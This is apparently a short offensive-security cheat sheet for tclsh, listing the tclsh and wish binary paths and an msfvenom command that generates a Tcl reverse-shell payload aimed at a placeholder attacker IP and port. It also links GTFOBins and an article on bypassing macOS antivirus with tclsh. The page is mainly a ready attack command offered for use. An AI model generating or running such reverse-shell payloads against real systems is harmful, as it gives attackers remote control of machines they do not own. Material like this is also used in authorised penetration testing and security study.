# Manual

## 01 - Common Files

```
/usr/bin/tclsh
/usr/bin/wish
```

## 02 - Generate Payloads

```
$ msfvenom -p cmd/unix/reverse_tclsh lhost=<IP> lport=<PORT>
```

---
## References

### GTFOBins

- [GTFOBins: tclsh](https://gtfobins.github.io/gtfobins/tclsh/)

### Null Byte

- [Null Byte: Hacking macOS - How to Use One Tclsh Command to Bypass Antivirus Protections](https://null-byte.wonderhowto.com/how-to/hacking-macos-use-one-tclsh-command-bypass-antivirus-protections-0186330/)